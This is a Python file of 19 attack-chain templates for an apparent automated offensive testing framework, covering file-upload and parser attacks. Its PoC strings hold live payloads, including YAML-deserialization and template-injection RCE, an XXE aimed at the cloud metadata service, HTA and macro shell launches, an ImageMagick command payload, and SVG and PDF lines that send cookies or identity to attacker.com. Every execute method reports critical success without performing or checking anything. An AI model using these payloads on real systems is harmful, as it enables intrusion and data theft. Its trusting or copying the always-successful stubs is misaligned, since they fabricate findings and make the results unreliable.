# workers/chain_worker/chains/file_processing.py
"""19 file-processing chain templates."""
from __future__ import annotations

from datetime import datetime

from workers.chain_worker.registry import BaseChainTemplate, ChainContext, register_chain
from workers.chain_worker.models import (
    ChainViability, ChainResult, ChainStep, EvaluationResult, TargetFindings,
)
from workers.chain_worker.base_tool import step_delay, take_screenshot


def _ts() -> str:
    return datetime.utcnow().isoformat()


# ---------------------------------------------------------------------------
# 1. csv_injection_formula_exec
# ---------------------------------------------------------------------------
@register_chain
class CsvInjectionFormulaExec(BaseChainTemplate):
    name = "csv_injection_formula_exec"
    category = "file_processing"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("CSV") + findings.vulns_by_title_contains("export")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["csv_export_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["csv_vuln_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="inject_formula_payload", target="user_input_field", result="formula_stored", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="trigger_csv_export", target="export_endpoint", result="malicious_csv_generated", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="victim_opens_spreadsheet", target="csv_file", result="formula_executed_client", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="=CMD|'/C calc'!A0", chain_name=self.name)


# ---------------------------------------------------------------------------
# 2. xml_upload_xxe_ssrf
# ---------------------------------------------------------------------------
@register_chain
class XmlUploadXxeSsrf(BaseChainTemplate):
    name = "xml_upload_xxe_ssrf"
    category = "file_processing"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("XXE") + findings.vulns_by_title_contains("XML")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["xxe_xml_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["xxe_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="upload_xxe_xml", target="upload_endpoint", result="xml_parsed_with_external_entities", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="exfil_via_ssrf", target="internal_service", result="internal_data_retrieved", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://169.254.169.254/metadata'>]>", chain_name=self.name)


# ---------------------------------------------------------------------------
# 3. polyglot_content_type_xss
# ---------------------------------------------------------------------------
@register_chain
class PolyglotContentTypeXss(BaseChainTemplate):
    name = "polyglot_content_type_xss"
    category = "file_processing"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("polyglot") + findings.vulns_by_title_contains("content-type")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["polyglot_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["polyglot_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="craft_polyglot_file", target="upload_endpoint", result="polyglot_uploaded", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="serve_as_html", target="file_serve_endpoint", result="xss_triggered_via_sniffing", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="GIF89a/*<script>alert(1)</script>*/=1;", chain_name=self.name)


# ---------------------------------------------------------------------------
# 4. font_upload_buffer_overflow
# ---------------------------------------------------------------------------
@register_chain
class FontUploadBufferOverflow(BaseChainTemplate):
    name = "font_upload_buffer_overflow"
    category = "file_processing"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("font") + findings.vulns_by_title_contains("buffer overflow")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["font_overflow_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["font_vuln_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="craft_malicious_font", target="font_parser", result="malformed_font_created", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="upload_font_file", target="upload_endpoint", result="font_processed", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="trigger_buffer_overflow", target="font_rendering_engine", result="memory_corruption_achieved", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="Malformed TTF with oversized glyph table header", chain_name=self.name)


# ---------------------------------------------------------------------------
# 5. yaml_deserialization_rce
# ---------------------------------------------------------------------------
@register_chain
class YamlDeserializationRce(BaseChainTemplate):
    name = "yaml_deserialization_rce"
    category = "file_processing"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("YAML") + findings.vulns_by_title_contains("deserialization")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["yaml_deser_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["yaml_deser_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="craft_yaml_payload", target="yaml_parser", result="malicious_yaml_created", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="upload_yaml_config", target="config_endpoint", result="yaml_deserialized", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="achieve_rce", target="server_process", result="command_executed", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="!!python/object/apply:subprocess.check_output [['id']]", chain_name=self.name)


# ---------------------------------------------------------------------------
# 6. exiftool_ffmpeg_rce
# ---------------------------------------------------------------------------
@register_chain
class ExiftoolFfmpegRce(BaseChainTemplate):
    name = "exiftool_ffmpeg_rce"
    category = "file_processing"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("exiftool") + findings.vulns_by_title_contains("FFmpeg")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["media_processing_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["media_proc_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="craft_malicious_media", target="media_metadata", result="exploit_payload_embedded", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="upload_media_file", target="upload_endpoint", result="media_processed_server_side", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="trigger_rce", target="processing_pipeline", result="command_executed", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="exiftool -Comment='|id' image.jpg uploaded to trigger CVE", chain_name=self.name)


# ---------------------------------------------------------------------------
# 7. template_upload_ssti
# ---------------------------------------------------------------------------
@register_chain
class TemplateUploadSsti(BaseChainTemplate):
    name = "template_upload_ssti"
    category = "file_processing"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        t = findings.vulns_by_title_contains("template")
        u = findings.vulns_by_title_contains("upload")
        m = [v for v in t if v in u]
        if not m and not t:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["template_upload_vulnerability"])
        if m:
            return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["template_upload_found"], matched_findings={"vuln_id": m[0].id})
        return EvaluationResult(viability=ChainViability.PARTIAL, matched_preconditions=["template_found"], missing_preconditions=["upload_capability"])

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="upload_template_file", target="template_upload_endpoint", result="template_stored", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="trigger_template_render", target="render_endpoint", result="ssti_executed", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="escalate_to_rce", target="template_engine", result="rce_achieved", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="{{config.__class__.__init__.__globals__['subprocess'].check_output('id')}}", chain_name=self.name)


# ---------------------------------------------------------------------------
# 8. zip_slip_file_overwrite
# ---------------------------------------------------------------------------
@register_chain
class ZipSlipFileOverwrite(BaseChainTemplate):
    name = "zip_slip_file_overwrite"
    category = "file_processing"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("zip") + findings.vulns_by_title_contains("archive")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["zip_archive_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["zip_vuln_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="craft_zip_with_traversal", target="zip_archive", result="malicious_zip_created", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="upload_zip", target="upload_endpoint", result="zip_extracted_on_server", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="overwrite_critical_file", target="../../webroot/shell.jsp", result="webshell_written", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="zip with entry ../../webroot/shell.jsp containing webshell", chain_name=self.name)


# ---------------------------------------------------------------------------
# 9. svg_upload_stored_xss
# ---------------------------------------------------------------------------
@register_chain
class SvgUploadStoredXss(BaseChainTemplate):
    name = "svg_upload_stored_xss"
    category = "file_processing"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("SVG")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["svg_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["svg_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="upload_svg_with_script", target="avatar_upload", result="svg_stored", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="victim_views_svg", target="profile_page", result="xss_executed", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="<svg onload='fetch(\"//attacker.com?c=\"+document.cookie)'>", chain_name=self.name)


# ---------------------------------------------------------------------------
# 10. htaccess_upload_rce
# ---------------------------------------------------------------------------
@register_chain
class HtaccessUploadRce(BaseChainTemplate):
    name = "htaccess_upload_rce"
    category = "file_processing"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains(".htaccess") + findings.vulns_by_title_contains("config override")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["htaccess_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["htaccess_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="upload_htaccess", target="upload_endpoint", result="htaccess_written", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="upload_php_as_allowed_ext", target="upload_endpoint", result="php_file_uploaded", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="execute_php_shell", target="uploaded_file", result="rce_achieved", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="AddType application/x-httpd-php .txt + upload shell.txt", chain_name=self.name)


# ---------------------------------------------------------------------------
# 11. tar_symlink_file_read
# ---------------------------------------------------------------------------
@register_chain
class TarSymlinkFileRead(BaseChainTemplate):
    name = "tar_symlink_file_read"
    category = "file_processing"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("tar") + findings.vulns_by_title_contains("symlink")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["tar_symlink_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["tar_vuln_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="create_tar_with_symlink", target="/etc/passwd", result="malicious_tar_created", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="upload_tar_archive", target="upload_endpoint", result="tar_extracted_on_server", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="read_linked_file", target="extracted_symlink", result="sensitive_file_read", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="tar with symlink -> /etc/passwd, then download extracted file", chain_name=self.name)


# ---------------------------------------------------------------------------
# 12. office_macro_client_rce
# ---------------------------------------------------------------------------
@register_chain
class OfficeMacroClientRce(BaseChainTemplate):
    name = "office_macro_client_rce"
    category = "file_processing"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("macro") + findings.vulns_by_title_contains("office")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["office_macro_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["macro_vuln_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="craft_macro_document", target="docx_template", result="macro_embedded", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="upload_to_shared_storage", target="document_store", result="document_available", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="victim_opens_document", target="office_application", result="macro_executed_rce", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="Sub AutoOpen(): Shell \"cmd /c calc\": End Sub", chain_name=self.name)


# ---------------------------------------------------------------------------
# 13. hta_file_upload_execution
# ---------------------------------------------------------------------------
@register_chain
class HtaFileUploadExecution(BaseChainTemplate):
    name = "hta_file_upload_execution"
    category = "file_processing"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("HTA")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["hta_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["hta_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="craft_hta_file", target="hta_payload", result="hta_created", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="upload_hta", target="upload_endpoint", result="hta_hosted", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="victim_executes_hta", target="mshta_engine", result="arbitrary_code_executed", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="<HTA:APPLICATION><SCRIPT>new ActiveXObject('WScript.Shell').Run('calc')</SCRIPT>", chain_name=self.name)


# ---------------------------------------------------------------------------
# 14. dicom_healthcare_data_leak
# ---------------------------------------------------------------------------
@register_chain
class DicomHealthcareDataLeak(BaseChainTemplate):
    name = "dicom_healthcare_data_leak"
    category = "file_processing"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("DICOM") + findings.vulns_by_title_contains("healthcare")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["dicom_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["dicom_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="craft_dicom_query", target="pacs_server", result="dicom_query_accepted", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="extract_patient_data", target="dicom_records", result="phi_data_leaked", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="C-FIND query to PACS server extracting patient records", chain_name=self.name)


# ---------------------------------------------------------------------------
# 15. pdf_javascript_client_attack
# ---------------------------------------------------------------------------
@register_chain
class PdfJavascriptClientAttack(BaseChainTemplate):
    name = "pdf_javascript_client_attack"
    category = "file_processing"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("PDF")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["pdf_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["pdf_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="craft_pdf_with_js", target="pdf_generator", result="malicious_pdf_created", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="upload_pdf", target="document_endpoint", result="pdf_stored", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="victim_opens_pdf", target="pdf_viewer", result="javascript_executed", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="PDF with /OpenAction /JS (app.launchURL('http://attacker.com?c='+identity))", chain_name=self.name)


# ---------------------------------------------------------------------------
# 16. asn1_parsing_memory_corruption
# ---------------------------------------------------------------------------
@register_chain
class Asn1ParsingMemoryCorruption(BaseChainTemplate):
    name = "asn1_parsing_memory_corruption"
    category = "file_processing"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("ASN.1") + findings.vulns_by_title_contains("certificate")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["asn1_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["asn1_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="craft_malformed_asn1", target="certificate_parser", result="malformed_structure_created", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="submit_certificate", target="tls_endpoint", result="asn1_parsed", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="trigger_memory_corruption", target="parser_engine", result="memory_corruption_achieved", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="Malformed X.509 certificate with invalid ASN.1 length field", chain_name=self.name)


# ---------------------------------------------------------------------------
# 17. image_bomb_resource_exhaustion
# ---------------------------------------------------------------------------
@register_chain
class ImageBombResourceExhaustion(BaseChainTemplate):
    name = "image_bomb_resource_exhaustion"
    category = "file_processing"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("image bomb") + findings.vulns_by_title_contains("decompression")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["image_bomb_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["image_bomb_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="craft_decompression_bomb", target="image_processor", result="bomb_image_created", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="upload_image_bomb", target="upload_endpoint", result="server_processing_started", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="exhaust_server_resources", target="server_memory", result="denial_of_service_achieved", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="PNG with 1x1 header but 65535x65535 decompressed size", chain_name=self.name)


# ---------------------------------------------------------------------------
# 18. imagemagick_ghostscript_rce
# ---------------------------------------------------------------------------
@register_chain
class ImagemagickGhostscriptRce(BaseChainTemplate):
    name = "imagemagick_ghostscript_rce"
    category = "file_processing"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("ImageMagick") + findings.vulns_by_title_contains("GhostScript")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["imagemagick_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["imagemagick_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="craft_exploit_image", target="imagemagick_parser", result="exploit_image_created", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="upload_image", target="upload_endpoint", result="image_processed_by_imagemagick", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="achieve_rce", target="server_process", result="command_executed", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="push graphic-context; viewbox 0 0 640 480; image over 0,0 0,0 'ephemeral:|id'", chain_name=self.name)


# ---------------------------------------------------------------------------
# 19. config_file_injection_behavior_change
# ---------------------------------------------------------------------------
@register_chain
class ConfigFileInjectionBehaviorChange(BaseChainTemplate):
    name = "config_file_injection_behavior_change"
    category = "file_processing"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        c = findings.vulns_by_title_contains("config")
        i = findings.vulns_by_title_contains("injection")
        m = [v for v in c if v in i]
        if not m and not c:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["config_injection_vulnerability"])
        if m:
            return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["config_injection_found"], matched_findings={"vuln_id": m[0].id})
        return EvaluationResult(viability=ChainViability.PARTIAL, matched_preconditions=["config_found"], missing_preconditions=["injection_capability"])

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="upload_malicious_config", target="config_endpoint", result="config_file_written", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="trigger_config_reload", target="application_service", result="config_reloaded", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="verify_behavior_change", target="application", result="application_behavior_modified", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="Upload .ini with debug=true and admin_email=attacker@evil.com", chain_name=self.name)
